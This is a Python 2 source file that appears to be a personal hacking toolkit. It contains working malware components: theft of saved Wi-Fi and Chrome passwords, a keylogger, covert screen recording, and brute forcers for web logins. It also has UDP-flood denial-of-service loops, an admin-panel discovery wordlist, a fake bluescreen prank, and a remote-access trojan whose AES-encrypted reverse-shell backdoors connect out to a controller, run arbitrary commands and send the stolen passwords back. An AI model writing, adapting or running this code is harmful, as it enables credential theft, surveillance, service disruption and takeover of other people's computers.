# -*- coding: utf-8 -*-
import numpy as np
import sqlite3
import mss
from pynput.keyboard import Key, Listener, Controller
import requests
import urllib2
from Crypto.Cipher import AES
import mechanize
from itertools import product
import sendkeys
from pygame import mixer
import SocketServer
import base64
import urlparse
import SimpleHTTPServer
from scapy.all import *
import cv2
try:
    import win32crypt
except:
    pass


class password_sniffing:
        def get_wifi_pwd(self):
            p = subprocess.Popen("netsh wlan show profile", stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()
            output1 = output.split("\n")[1]
            list = output.split()
            wifi_names = []
            wifi_passwords = []

            for i in range(len(list)):
                if (list[i] == "Benutzer"):
                    wifi_names.append(list[i + 2])

            for i in range(len(wifi_names)):
                p = subprocess.Popen("netsh wlan show profile name=" + wifi_names[i] + " key=clear", stdout=subprocess.PIPE,
                                     shell=True)
                (output2, err) = p.communicate()
                p_status = p.wait()
                list2 = output2.split()
                x = 0
                for x in range(len(list2)):
                    if (list2[x] == "Kosteneinstellungen"):
                        a = list2[i - 1]
                        wifi_passwords.append(list2[x - 1])

            output_name_pwd = []
            for i in range(len(wifi_names)):
                try:
                    info = wifi_names[i] + ":" + wifi_passwords[i]
                    output_name_pwd.append(info)
                except:
                    pass
            return output_name_pwd

        
        def getChromepass(self):
            info_list = []

            if os.name == "nt":
                path = os.getenv('localappdata') + \
                       '\\Google\\Chrome\\User Data\\Default\\'

            if not os.path.isdir(path):
                print('[!] Chrome Doesn\'t exists')

            try:
                connection = sqlite3.connect(path + "Login Data")
                with connection:
                    cursor = connection.cursor()
                    v = cursor.execute(
                        'SELECT action_url, username_value, password_value FROM logins')
                    value = v.fetchall()

                for origin_url, username, password in value:
                    if os.name == 'nt':
                        password = win32crypt.CryptUnprotectData(
                            password, None, None, None, 0)[1]

                    if password:
                        info_list.append({
                            'origin_url': origin_url,
                            'username': username,
                            'password': str(password)
                        })

            except sqlite3.OperationalError as e:
                e = str(e)
                if (e == 'database is locked'):
                    print('[!] Make sure Google Chrome is not running in the background')
                elif (e == 'no such table: logins'):
                    print('[!] Something wrong with the database name')
                elif (e == 'unable to open database file'):
                    print('[!] Something wrong with the database path')
                else:
                    print(e)
                sys.exit(0)

            return info_list
password_sniffing = password_sniffing()



class encrypt:
        def b64encode(self,data):
            return base64.b64encode(str(data))

        def caeser_encode(self,text, key):
            alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!\"§$%&/()=?`´*#^°|_-'*+~,;.:\}][{ "
            alphlist = list(alphabet)
            textlist = list(text)
            output = []
            string_out = ''
            if key > len(alphlist):
                for x in range(key):
                    key -= x
                    if key < alphlist:
                        break
            for letter in textlist:
                if letter in alphabet:
                    position = alphabet.find(letter)
                    position = position + key
                    if position > len(alphlist):
                        position = position - len(alphlist)
                    else:
                        pass
                    string_out += alphlist[position]
            string_out.join(output)
            return string_out
encrypt = encrypt()


class decrypt:
    def b64decode(self,data):
        return base64.b64decode(str(data))

    def caeser_decode(self, text, key):
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!\"§$%&/()=?`´*#^°|_-'*+~,;.:\}][{ "
        alphlist = list(alphabet)
        textlist = list(text)
        output = []
        string_out = ''
        if key > len(alphlist):
            for x in range(key):
                key -= x
                if key < alphlist:
                    break
        for letter in textlist:
            if letter in alphabet:
                position = alphabet.find(letter)
                position = position - key
                if position < 0:
                    position = len(alphlist) - key
                else:
                    pass
                string_out += alphlist[position]
            else:
                string_out += letter
        #string_out.join(output)
        string_out = string_out.replace("\xc2"," ")
        string_out = string_out.replace("��"," ").replace("�", " ")
        return string_out
decrypt = decrypt()


class password_cracking:
    def html_wordlist_bruteforce(self,wordlist, login_link, loggedin_link, html_user, html_password, target_username):
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)

        arq = open(wordlist, 'r').readlines()

        for line in arq:
            passsword = line.strip()

            br.open(login_link)
            br.select_form(nr=0)
            #br.form[html_user] = target_username
            br.form[html_password] = passsword
            print "Checking ", br.form['password']
            response = br.submit()
            if response.geturl() == loggedin_link:
                # url to which the page is redirected after login
                print "[+] Correct password is " + passsword
                break


    def html_bruteforce(password_length, char_set, login_link, loggedin_link, html_user, html_password, target_username):
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        for length in range(1, int(password_length) + 1):
            to_attempt = product(str(char_set), repeat=length)
            for attempt in to_attempt:
                password = ''.join(attempt)
                br.open(login_link)
                br.select_form(nr=0)
                br.form[html_user] = target_username
                br.form[html_password] = password
                print "Checking ", br.form['password']
                response = br.submit()
                if response.geturl() == loggedin_link:
                    # url to which the page is redirected after login
                    print "Correct password is " + password
                    break


    def password_checker(login_link, loggedin_link, html_user, html_password, target_username, target_password):
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.open(login_link)
        br.select_form(nr=0)
        br.form[html_user] = str(target_username)
        br.form[html_password] = str(target_password)
        response = br.submit()
        if response.geturl() == loggedin_link:
            # url to which the page is redirected after login
            return "[+]" + login_link
        else:
            return "[-]" + login_link


password_cracking = password_cracking()


#system controll & overwatch technics
class pc:
    def keylogger(self,filename):
        logging.basicConfig(filename=(filename), level=logging.DEBUG, format='%(message)s')  # %(asctime)s (mit zeit)

        def on_press(key):
            logging.info(encrypt.b64encode(str(key)))

        with Listener(on_press=on_press) as listener:
            listener.join()

    def read_keylogger(self,filename):
        f = open(str(filename))
        for line in f:
            x = str(decrypt.b64decode(line))
            y = x.replace("u", "")
            z = y.replace("'", "")
            print(z)

        f.close()

    #play mp3 with volume
    def mp3_stream(self,test_url):
        mixer.init()
        r = requests.get(test_url, stream=True)
        mixer.music.load(r.raw)
        mixer.music.play()
        while mixer.music.get_busy():
            time.sleep(1)

    #set volume form 0 to 100
    def set_volume(self,volume):
        i = 0
        while i < volume / 2:
            sendkeys.PressKey(0xAF)
            sendkeys.ReleaseKey(0xAF)
            i += 1

    #streams mp3 from online service and sets volume
    def mp3_stream_volume(self,test_url, volume):
        pc.set_volume(volume)
        mixer.init()
        r = requests.get(test_url, stream=True)
        mixer.music.load(r.raw)
        mixer.music.play()
        while mixer.music.get_busy():
            pc.set_volume(volume)
            time.sleep(1)

    #changes desktop background with link of image or image
    def background_changer(self,link):
        network.download(link)
        picdir = os.getcwd() + "\\" + os.path.basename(link)
        print(picdir)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, picdir, 3)

    #video captures the screen
    def the_eye(self):

        def screenrecord(width, height):
            frame_width = 1920
            frame_height = 1080
            frame_rate = 20.0
            PATH_TO_MIDDLE = "output.avi"
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(PATH_TO_MIDDLE, fourcc, frame_rate,
                                  (frame_width, frame_height))


            with mss.mss() as sct:
                # Part of the screen to capture
                monitor = {"top": 120, "left": 280, "width": width, "height": height}

                while "Screen capturing":
                    last_time = time.time()

                    # Get raw pixels from the screen, save it to a Numpy array
                    img = np.array(sct.grab(monitor))
                    img = cv2.resize(img, (1920, 1080))
                    frame = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

                    # cv2.putText(frame, "FPS: %f" % (1.0 / (time.time() - last_time)),(10, 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2)


                    out.write(frame)
                    # cv2.imshow('frame', frame)

                    # Press "q" to quit
                    # if cv2.waitKey(25) & 0xFF == ord("q"):
                    #    break

        check_sc = []
        for monitor in mss.mss().monitors:
            monitor = str(monitor).replace("{'", "").replace("': ", "#").replace(", '", "#").replace("}", "")
            monitor = monitor.split("#")
            Width = monitor[1]
            Height = monitor[5]
            if (Height not in check_sc or Width not in check_sc):
                check_sc.append(Width)
                check_sc.append(Height)
                if (len(check_sc) / 2 == 1):
                    thread1 = threading.Thread(target=screenrecord, args=(int(Width), int(Height)))
                    thread1.start()
                elif (len(check_sc) / 2 == 2):
                    thread2 = threading.Thread(target=screenrecord, args=(int(Width), int(Height)))
                    thread2.start()
                else:
                    print("Not working...")
                    input()

    def sendkey_secure(string):
        list = string.split()
        print(list)
        i = 0
        hex_list = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,
                    0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56,
                    0x57, 0x58, 0x59, 0x5A, 0x6A, 0x0D, 0x20, 0x09, 0xA3, 0x5B, 0xA4, 0x14, 0x2E, 0x08]
        key_list1 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
                     "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "*", "{ENTER}",
                     "{SPACE}", "{TAB}", "{STRG}", "{WIN}", "{ALT}", "{CAPSLOCK}", "{DEL}", "{BACK}"]
        key_list2 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                     "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "*", "{enter}",
                     "{space}", "{tab}", "{strg}", "{win}", "{alt}", "{capslock}", "{del}", "{back}"]
        while i < len(list):
            x = 0
            while x < len(key_list1):
                if (list[i] == key_list1[x] or list[i] == key_list2[x]):
                    sendkeys.PressKey(hex_list[x])
                    sendkeys.ReleaseKey(hex_list[x])
                else:
                    pass
                x += 1
            i += 1
    # tim.sleep(5)
    # sendkey_secure("{CAPSLOCK}")

    def sendkeys_easy(string):
        s = list(string)
        print(s)
        i = 0
        hex_list = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,
                    0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56,
                    0x57, 0x58, 0x59, 0x5A, 0x6A, 0x0D, 0x20, 0x09, 0xA3, 0x5B, 0xA4, 0x14]
        key_list1 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J",
                     "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "*", "{ENTER}",
                     "{SPACE}", "{TAB}", "{STRG}", "{WIN}", "{ALT}", "{CAPSLOCK}"]
        key_list2 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                     "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "*", "{enter}",
                     " ", "{tab}", "{strg}", "{win}", "{alt}", "{capslock}"]
        while i < len(s):
            x = 0
            while x < len(key_list1):
                if (s[i] == key_list1[x] or s[i] == key_list2[x]):
                    sendkeys.PressKey(hex_list[x])
                    sendkeys.ReleaseKey(hex_list[x])
                else:
                    pass
                x += 1
            i += 1

    def bluescreen(self):
        code = """
    <html><head><title>Microsoft Windows</title> 
    <hta:application id="oBVC" 
    applicationname="BSOD"  
    version="1.0" 
    maximizebutton="no" 
    minimizebutton="no" 
    sysmenu="no" 
    Caption="no" 
    windowstate="maximize"/> 

    </head><body bgcolor="#000088" scroll="no"> 
    <font face="Lucida Console" size="4" color="white"> 
    <p>A problem has been detected and windows has been shutdown to prevent damage to your computer.</p> 

    <p>DRIVER_IRQL_NOT_LES_OR_EQUAL</p> 

    <p>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:</p> 

    <p>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.</p> 

    <p>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.</p> 

    <p>Technical information:</p> 

    <p>*** STOP: 0x00D1 (0x00C,0x002,0x00,0xF86B5A89)</p> 


    <p>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb</p> 

    <p>Beginning dump of physical memory</p> 
    <p>Physical memory dump complete.</p> 
    <p>Contact your system administrator or technical support group for further assistance.</p> 


    </font> 
    </body>

    <script language="javascript">
    function noClick() {
    if ((event.button==1)||(event.button==2)) {
    alert('Error: 00101100x00100100 missing keymgr.dll')
    }
    }
    document.onmousedown=noClick
    </script>

    </html> 
        """
        text_file = open("bsod.hta", "w")

        text_file.write(code)

        text_file.close()

        time.sleep(2)
        try:
            os.system("start bsod.hta")
        except:
            pass

    def display(command):

        if command == 0:
            try:
                os.system("%systemroot%\system32\scrnsave.scr /s")

            except:
                pass

        elif command == 1:
            while 1:
                os.system("%systemroot%\system32\scrnsave.scr /s")

pc = pc()


class network:

        def getLocal_IP(self):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip

        def download(self,url):
            a = urlparse.urlparse(url)
            b = os.path.basename(a.path)
            r = requests.get(url, allow_redirects=True)
            open(b, 'wb').write(r.content)

        def UDP_Flooding(victim, vport, duration):
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            timeout = time.time() + duration
            sent = 0

            while 1:
                if time.time() > timeout:
                    break
                else:
                    pass
                client.sendto(bytes, (victim, vport))
                sent = sent + 1
                print "Attacking %s sent packages %s at the port %s " % (sent, victim, vport)

        def Create_HTTP_Server(self,port):
            Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
            httpd = SocketServer.TCPServer((System_Tools.getLocal_IP(), port), Handler)
            print(System_Tools.getLocal_IP() + ":" + str(port))
            httpd.serve_forever()

        # admin_panel_finder("www.mywebsite.com", # ):       # --> 1 with text --> 0 without text
        def admin_panel_finder(self,target, with_txt):
            tempa = 0
            tempb = -1
            active_admin_panels = []
            list1 = ["admin.php", "admin.html", "index.php", "login.php", "login.html", "administrator", "admin",
                     "adminpanel",
                     "cpanel", "login", "wp-login.php", "administrator", "admins", "logins", "admin.asp", "login.asp",
                     "adm/",
                     "admin/", "admin/account.html", "admin/login.html", "admin/login.htm", "admin/controlpanel.html",
                     "admin/controlpanel.htm", "admin/adminLogin.html", "admin/adminLogin.htm", "admin.htm",
                     "admin.html",
                     "adminitem/", "adminitems/", "administrator/", "administrator/login.%EXT%", "administrator.%EXT%",
                     "administration/", "administration.%EXT%", "adminLogin/", "adminlogin.%EXT%",
                     "admin_area/admin.%EXT%",
                     "admin_area/", "admin_area/login.%EXT%", "manager/", "superuser/", "superuser.%EXT%", "access/",
                     "access.%EXT%", "sysadm/", "sysadm.%EXT%", "superman/", "supervisor/", "panel.%EXT%", "control/",
                     "control.%EXT%", "member/", "member.%EXT%", "members/", "user/", "user.%EXT%", "cp/", "uvpanel/",
                     "manage/", "manage.%EXT%", "management/", "management.%EXT%", "signin/", "signin.%EXT%", "log-in/",
                     "log-in.%EXT%", "log_in/", "log_in.%EXT%", "sign_in/", "sign_in.%EXT%", "sign-in/",
                     "sign-in.%EXT%",
                     "users/", "users.%EXT%", "accounts/", "accounts.%EXT%", "bb-admin/login.%EXT%",
                     "bb-admin/admin.%EXT%",
                     "bb-admin/admin.html", "administrator/account.%EXT%", "relogin.htm", "relogin.html", "check.%EXT%",
                     "relogin.%EXT%", "blog/wp-login.%EXT%", "user/admin.%EXT%", "users/admin.%EXT%", "registration/",
                     "processlogin.%EXT%", "checklogin.%EXT%", "checkuser.%EXT%", "checkadmin.%EXT%", "isadmin.%EXT%",
                     "authenticate.%EXT%", "authentication.%EXT%", "auth.%EXT%", "authuser.%EXT%", "authadmin.%EXT%",
                     "cp.%EXT%", "modelsearch/login.%EXT%", "moderator.%EXT%", "moderator/", "controlpanel/",
                     "controlpanel.%EXT%", "admincontrol.%EXT%", "adminpanel.%EXT%", "fileadmin/", "fileadmin.%EXT%",
                     "sysadmin.%EXT%", "admin1.%EXT%", "admin1.html", "admin1.htm", "admin2.%EXT%", "admin2.html",
                     "yonetim.%EXT%", "yonetim.html", "yonetici.%EXT%", "yonetici.html", "phpmyadmin/", "myadmin/",
                     "ur-admin.%EXT%", "ur-admin/", "Server.%EXT%", "Server/", "wp-admin/", "administr8.%EXT%",
                     "administr8/",
                     "webadmin/", "webadmin.%EXT%", "administratie/", "admins/", "admins.%EXT%", "administrivia/",
                     "Database_Administration/", "useradmin/", "sysadmins/", "sysadmins/", "admin1/",
                     "system-administration/",
                     "administrators/", "pgadmin/", "directadmin/", "staradmin/", "ServerAdministrator/", "SysAdmin/",
                     "administer/", "LiveUser_Admin/", "sys-admin/", "typo3/", "panel/", "cpanel/", "cpanel_file/",
                     "platz_login/", "rcLogin/", "blogindex/", "formslogin/", "autologin/", "manuallogin/",
                     "simpleLogin/",
                     "loginflat/", "utility_login/", "showlogin/", "memlogin/", "login-redirect/", "sub-login/",
                     "wp-login/",
                     "login1/", "dir-login/", "login_db/", "xlogin/", "smblogin/", "customer_login/", "UserLogin/",
                     "login-us/",
                     "acct_login/", "bigadmin/", "project-admins/", "phppgadmin/", "pureadmin/", "sql-admin/",
                     "radmind/",
                     "openvpnadmin/", "wizmysqladmin/", "vadmind/", "ezsqliteadmin/", "hpwebjetadmin/", "newsadmin/",
                     "adminpro/", "Lotus_Domino_Admin/", "bbadmin/", "vmailadmin/", "Indy_admin/", "ccp14admin/",
                     "irc-macadmin/", "banneradmin/", "sshadmin/", "phpldapadmin/", "macadmin/",
                     "administratoraccounts/",
                     "admin4_account/", "admin4_colon/", "radmind-1/", "Super-Admin/", "AdminTools/", "cmsadmin/",
                     "SysAdmin2/",
                     "globes_admin/", "cadmins/", "phpSQLiteAdmin/", "navSiteAdmin/", "server_admin_small/",
                     "logo_sysadmin/",
                     "power_user/", "system_administration/", "ss_vms_admin_sm/", "bb-admin/", "panel-administracion/",
                     "instadmin/", "memberadmin/", "administratorlogin/", "adm.%EXT%", "admin_login.%EXT%",
                     "panel-administracion/login.%EXT%", "pages/admin/admin-login.%EXT%", "pages/admin/",
                     "acceso.%EXT%",
                     "admincp/login.%EXT%admincp/", "adminarea/", "admincontrol/", "affiliate.%EXT%", "adm_auth.%EXT%",
                     "memberadmin.%EXT%", "administratorlogin.%EXT%", "modules/admin/", "administrators.%EXT%",
                     "siteadmin/",
                     "siteadmin.%EXT%", "adminsite/", "kpanel/", "vorod/", "vorod.%EXT%", "vorud/", "vorud.%EXT%",
                     "adminpanel/", "PSUser/", "secure/", "webmaster/", "webmaster.%EXT%", "autologin.%EXT%",
                     "userlogin.%EXT%",
                     "admin_area.%EXT%", "cmsadmin.%EXT%", "security/", "usr/", "root/", "secret/", "admin/login.%EXT%",
                     "admin/adminLogin.%EXT%", "moderator.php", "moderator.html", "moderator/login.%EXT%",
                     "moderator/admin.%EXT%", "yonetici.%EXT%", "0admin/", "0manager/", "aadmin/", "cgi-bin/login%EXT%",
                     "login1%EXT%", "login_admin/", "login_admin%EXT%", "login_out/", "login_out%EXT%",
                     "login_user%EXT%",
                     "loginerror/", "loginok/", "loginsave/", "loginsuper/", "loginsuper%EXT%", "login%EXT%", "logout/",
                     "logout%EXT%", "secrets/", "super1/", "super1%EXT%", "super_index%EXT%", "super_login%EXT%",
                     "supermanager%EXT%", "superman%EXT%", "superuser%EXT%", "supervise/", "supervise/Login%EXT%",
                     "super%EXT%"]
            r = requests.get('http://' + target)
            a = str(r.url)
            b = a.split("w")
            if b[0] == "https://":
                protocol = "https://"
            else:
                protocol = "http://"
            while tempb <= len(list1):
                tempb += 1
                code = protocol + target + "/" + ''.join(list1[tempb])
                try:
                    urllib2.urlopen(code)
                    if with_txt == 1:
                        print("[+] " + code)
                    active_admin_panels.append(code)
                except:
                    if with_txt == 1:
                        print("[-] " + code)
                    pass
            if with_txt == 1:
                print "Finished \n"
            return active_admin_panels

        def SLOW_HTTP(self,TARGET_IP):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)
            ip = TARGET_IP
            port = 80
            sent = 0

            while True:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                port = port + 1

                print "Sent %s packet to %s throught port %s" % (sent, ip, port)
                if port == 65534:
                    port = 1

        def portscan(self,target):
            targetIP = socket.gethostbyname(target)
            tstart = datetime.now()
            try:
                for p in range(1, 30):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    res = sock.connect_ex((targetIP, p))
                    if res == 0:
                        print("Offene Verbindung in Port " + str(p))
                    sock.close()
            except Exception:
                print("There was an error.")
                sys.exit()

            tend = datetime.now()
            diff = tend - tstart

            print("Scan completed in " + str(diff))
network = network()

class system_tools:

        def check_admin(self):
            try:
                is_admin = os.getuid() == 0
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

            return is_admin

        def getLocal_IP(self):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
system_tools = system_tools()


class RAT:
    def start_listener(HOST, PORT, crypt_key):
        while True:
            try:
                BLOCK_SIZE = 32

                PADDING = '{'

                pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

                EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
                DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

                secret = crypt_key

                iv = os.urandom(16)
                cipher = AES.new(secret, AES.MODE_CFB, iv)

                c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                c.bind((HOST, int(PORT)))
                c.listen(1)
                s, a = c.accept()

                while True:

                    data = s.recv(1024)

                    decrypted = DecodeAES(cipher, data)

                    if decrypted.endswith("---Message_Deadline---") == True:

                        print decrypted[:-16]

                        nextcmd = raw_input("[shell]: ")
                        encrypted = EncodeAES(cipher, nextcmd)
                        s.send(encrypted)

                    # else, just print
                    else:
                        print decrypted
            except:
                time.sleep(1)
                pass

    def start_backdoor(HOST, PORT, crypt_key):
        BLOCK_SIZE = 32

        PADDING = '{'

        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

        secret = crypt_key

        iv = os.urandom(16)
        cipher = AES.new(secret, AES.MODE_CFB, iv)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((HOST, int(PORT)))

        success = EncodeAES(cipher, 'Success! We made it!---Message_Deadline---')
        s.send(success)

        while 1:

            data = s.recv(1024)

            decrypted = DecodeAES(cipher, data)

            if decrypted == "quit":
                break

            proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdoutput = proc.stdout.read() + proc.stderr.read() + '---Message_Deadline---'
            encrypted = EncodeAES(cipher, stdoutput)
            s.send(encrypted)

        s.close()

    def start_backdoor_special(HOST, PORT, crypt_key):

        help_text = """
        quit                        Exit the Shell

        bluescreen                  Make fake Bluescreen

        mp3 <link> <volume>         Stream MP3 File

        set-volume <volume>         Set Volume of PC (0 - 100)

        download <link>             Download File over Link

        change-background <link>    Changes Background to Internet-Link

        password-sniffer            Steals saved Chrome and Wifi passwords
        """
        while (1):
            try:
                BLOCK_SIZE = 32

                PADDING = '{'

                pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
                EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
                DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

                secret = crypt_key

                iv = os.urandom(16)
                cipher = AES.new(secret, AES.MODE_CFB, iv)

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                s.connect((HOST, int(PORT)))

                success = EncodeAES(cipher, 'Success! We made it!---Message_Deadline---')
                s.send(success)

                while 1:

                    data = s.recv(1024)

                    decrypted = DecodeAES(cipher, data)
                    input_array = str(decrypted).split()

                    if decrypted == "quit":
                        try:
                            os.system("exit")
                        except:
                            pass

                        break

                    if decrypted == "bluescreen":
                        pc.bluescreen()

                    if input_array[0] == "mp3":
                        pc.mp3_stream_volume(input_array[1], int(input_array[2]))

                    if input_array[0] == "set-volume":
                        pc.set_volume(int(input_array[1]))

                    if input_array[0] == "download":
                        try:
                            network.download(str(input_array[1]))
                        except:
                            pass

                    if input_array[0] == "change-background":
                        try:
                            pc.background_changer(str(input_array[1]))
                        except:
                            pass

                    if input_array[0] == "password-sniffer":
                        try:
                            wifi = password_sniffing.get_wifi_pwd()
                            chrome = password_sniffing.getChromepass()

                            passw = []
                            passw.append(wifi)
                            passw.append(chrome)

                            success = EncodeAES(cipher, passw)
                            s.send(success)

                        except:
                            pass

                    if decrypted == "help" or "HELP":
                        success = EncodeAES(cipher, help_text)
                        s.send(success)

                    proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read() + '---Message_Deadline---'
                    encrypted = EncodeAES(cipher, stdoutput)

                    s.send(encrypted)
                    s.close()

            except:
                pass

    def backdoor_local_watchout(PORT, crypt_key):
        help_text = """
        quit                        Exit the Shell

        bluescreen                  Make fake Bluescreen

        mp3 <link> <volume>         Stream MP3 File

        set-volume <volume>         Set Volume of PC (0 - 100)

        download <link>             Download File over Link

        change-background <link>    Changes Background to Internet-Link

        password-sniffer            Steals saved Chrome and Wifi passwords
        """
        while (1):
            local = network.getLocal_IP()[:-1]
            con_ip = ""
            for i in range(255):
                ip = local + str(i)
                print ip
                try:
                    BLOCK_SIZE = 32

                    PADDING = '{'

                    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
                    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
                    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

                    secret = crypt_key

                    iv = os.urandom(16)
                    cipher = AES.new(secret, AES.MODE_CFB, iv)

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    if con_ip != "":
                        s.connect((con_ip, int(PORT)))
                    else:
                        s.connect((ip, int(PORT)))

                    success = EncodeAES(cipher, 'Success! We made it!---Message_Deadline---')

                    s.send(success)

                    while 1:

                        data = s.recv(1024)
                        con_ip = ip
                        decrypted = DecodeAES(cipher, data)
                        input_array = str(decrypted).split()

                        if decrypted == "quit":
                            try:
                                os.system("exit")
                            except:
                                pass

                            break

                        if decrypted == "bluescreen":
                            pc.bluescreen()

                        if input_array[0] == "mp3":
                            pc.mp3_stream_volume(input_array[1], int(input_array[2]))

                        if input_array[0] == "set-volume":
                            pc.set_volume(int(input_array[1]))

                        if input_array[0] == "download":
                            try:
                                network.download(str(input_array[1]))
                            except:
                                pass

                        if input_array[0] == "change-background":
                            try:
                                pc.background_changer(str(input_array[1]))
                            except:
                                pass

                        if input_array[0] == "password-sniffer":
                            try:
                                wifi = password_sniffing.get_wifi_pwd()
                                chrome = password_sniffing.getChromepass()

                                passw = []
                                passw.append(wifi)
                                passw.append(chrome)

                                success = EncodeAES(cipher, passw)
                                s.send(success)

                            except:
                                pass

                        if decrypted == "help" or "HELP":
                            success = EncodeAES(cipher, help_text)
                            s.send(success)

                        proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                        stdoutput = proc.stdout.read() + proc.stderr.read() + '---Message_Deadline---'
                        encrypted = EncodeAES(cipher, stdoutput)

                        s.send(encrypted)
                        s.close()

                except:
                    pass

RAT = RAT()